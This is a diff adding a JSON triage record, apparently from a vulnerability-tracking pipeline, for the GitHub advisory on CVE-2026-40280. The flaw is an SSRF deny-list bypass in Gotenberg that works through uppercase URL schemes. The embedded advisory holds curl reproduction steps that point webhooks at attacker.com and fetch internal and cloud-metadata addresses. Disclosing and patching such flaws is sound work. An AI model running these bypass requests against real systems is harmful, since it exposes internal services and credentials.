@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/60306789?v=4\", \"events_url\": \"https://api.github.com/users/morimori-dev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/morimori-dev/followers\", \"following_url\": \"https://api.github.com/users/morimori-dev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/morimori-dev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/morimori-dev\", \"id\": 60306789, \"login\": \"morimori-dev\", \"node_id\": \"MDQ6VXNlcjYwMzA2Nzg5\", \"organizations_url\": \"https://api.github.com/users/morimori-dev/orgs\", \"received_events_url\": \"https://api.github.com/users/morimori-dev/received_events\", \"repos_url\": \"https://api.github.com/users/morimori-dev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/morimori-dev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/morimori-dev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/morimori-dev\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-40280\", \"cvss\": {\"score\": 9.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N\"}, \"cvss_v4\": {\"score\": 7.8, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:L/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Vulnerability Details\\n\\n**CWE**: CWE-918 - Server-Side Request Forgery (SSRF)\\n\\nThe default private-IP deny-lists for --webhook-deny-list and --api-download-from-deny-list use a case-sensitive regex (^https?://). Any uppercase URL scheme variant (HTTP://, HTTPS://, Http://) bypasses the pattern. Go's net/url.Parse() normalizes the scheme to lowercase when making the outbound TCP connection, so the connection succeeds normally. Affected: pkg/gotenberg/filter.go:FilterDeadline(), pkg/modules/webhook/webhook.go:42, pkg/modules/api/api.go:199. Confirmed in Docker: http://172.17.0.1:12345/ returns HTTP 403 (blocked), HTTP://172.17.0.1:12345/ returns HTTP 202 (bypassed, TCP connection attempted). Same pattern as CVE-2026-27018/GHSA-jjwv-57xh-xr6r but in newly added webhook+downloadFrom deny-lists (commit 3f01ca1, 2026-04-07). Affected versions: <= 8.30.1. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N = 9.1.\\n\\n## Summary\\n\\nThe default private-IP deny-lists for `--webhook-deny-list` and `--api-download-from-deny-list` use a case-sensitive regex (`^https?://`). Any uppercase URL scheme variant (`HTTP://`, `HTTPS://`, `Http://`) bypasses the pattern. Go's `net/url.Parse()` normalizes the scheme to lowercase when making the outbound TCP connection, so the connection succeeds normally.\\n\\nThe same bypass (case-insensitive scheme) was previously reported for the Chromium deny-list in CVE-2026-27018 (GHSA-jjwv-57xh-xr6r), but the newly added deny-lists for webhook and downloadFrom contain the identical flaw.\\n\\n**Affected file/function**: `pkg/gotenberg/filter.go:FilterDeadline()`, `pkg/modules/webhook/webhook.go:42` (default regex), `pkg/modules/api/api.go:199` (default regex)\\n\\n## Steps to Reproduce\\n\\n```\\n1. Start Gotenberg:\\n   docker run --rm -d -p 3001:3000 --name gotenberg-test gotenberg/gotenberg:8\\n\\n2. Baseline — lowercase http:// is blocked (HTTP 403):\\n   curl -s -w \\\"\\\\nHTTP %{http_code}\\\" -X POST http://localhost:3001/forms/chromium/convert/url \\\\\\n     -H \\\"Gotenberg-Webhook-Url: http://172.17.0.1:12345/callback\\\" \\\\\\n     -H \\\"Gotenberg-Webhook-Events-Url: http://attacker.com/events\\\" \\\\\\n     -F \\\"url=https://example.com/\\\"\\n\\n3. Bypass — uppercase HTTP:// bypasses deny-list (HTTP 202, connection attempted):\\n   curl -s -w \\\"\\\\nHTTP %{http_code}\\\" -X POST http://localhost:3001/forms/chromium/convert/url \\\\\\n     -H \\\"Gotenberg-Webhook-Url: HTTP://172.17.0.1:12345/callback\\\" \\\\\\n     -H \\\"Gotenberg-Webhook-Events-Url: http://attacker.com/events\\\" \\\\\\n     -F \\\"url=https://example.com/\\\"\\n   # Returns 202 + Gotenberg logs: \\\"Post \\\\\\\"http://172.17.0.1:12345/callback\\\\\\\": connection refused\\\"\\n\\n4. downloadFrom bypass (response content included in PDF):\\n   curl -s -w \\\"\\\\nHTTP %{http_code}\\\" http://localhost:3001/forms/chromium/convert/html \\\\\\n     -F 'files=@/dev/stdin;filename=index.html;type=text/html' \\\\\\n     -F 'downloadFrom=[{\\\"url\\\":\\\"HTTP://172.17.0.1:12345/secret.html\\\"}]' <<< '<html><body>test</body></html>'\\n   # Error is \\\"Unable to download file\\\" (connection refused), not \\\"filter URL\\\" — bypass confirmed\\n```\\n\\n## Impact\\n\\nAn unauthenticated attacker can access internal network services (private IP ranges, loopback, link-local) that the deny-list was designed to block. The `downloadFrom` SSRF can exfiltrate content from internal services that respond with `Content-Disposition` headers. In cloud environments, this could allow access to instance metadata services (e.g., `HTTP://169.254.169.254/latest/meta-data/`). This bypasses the same security control that was patched in CVE-2026-27018.\\n\\n## Fix\\n\\nNormalize the URL scheme to lowercase before passing to `FilterDeadline`, or compile deny-list regexes with the case-insensitive flag (`(?i)`).\\n\\n### Vulnerable Code\\n\\n```go\\n// See description for details\\n```\\n\\n## Steps to Reproduce\\n\\n1. Set up the application using the default configuration\\n2. See the vulnerability details above\\n\\n\\n## Impact\\n\\nThis vulnerability may allow an attacker to compromise the application.\", \"epss\": {\"percentage\": 0.00463, \"percentile\": 0.36562}, \"ghsa_id\": \"GHSA-5q7p-7jgv-ww56\", \"github_reviewed_at\": \"2026-04-30T17:19:49Z\", \"html_url\": \"https://github.com/advisories/GHSA-5q7p-7jgv-ww56\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-5q7p-7jgv-ww56\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-40280\"}], \"nvd_published_at\": \"2026-05-05T20:16:38Z\", \"published_at\": \"2026-04-30T17:19:49Z\", \"references\": [\"https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5q7p-7jgv-ww56\", \"https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-40280\", \"https://github.com/gotenberg/gotenberg/commit/3f01ca18d3cc21375a1e2da4b5a3f261c8548e47\", \"https://github.com/advisories/GHSA-jjwv-57xh-xr6r\", \"https://github.com/advisories/GHSA-5q7p-7jgv-ww56\"], \"repository_advisory_url\": \"https://api.github.com/repos/gotenberg/gotenberg/security-advisories/GHSA-5q7p-7jgv-ww56\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/gotenberg/gotenberg\", \"summary\": \"Gotenberg has case-insensitive URL scheme that bypasses webhook and downloadFrom deny-list SSRF protection\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-08T15:31:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-5q7p-7jgv-ww56\", \"vulnerabilities\": [{\"first_patched_version\": \"8.31.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/gotenberg/gotenberg/v8\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 8.30.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-5q7p-7jgv-ww56",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/gotenberg/gotenberg/v8: <= 8.30.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-27018",
+      "CVE-2026-40280"
+    ],
+    "cvss_score": 9.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/gotenberg/gotenberg/v8"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.394284Z",
+  "provenance": {
+    "content_sha256": "27825c972926c26d0fe1e725e49283eca0910a4cddb9e0a3942fa4dd62ecb337",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-30T17:19:49Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-5q7p-7jgv-ww56",
+  "status": "active",
+  "title": "Gotenberg has case-insensitive URL scheme that bypasses webhook and downloadFrom deny-list SSRF protection",
+  "updated_at": "2026-05-08T15:31:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-5q7p-7jgv-ww56"
+}
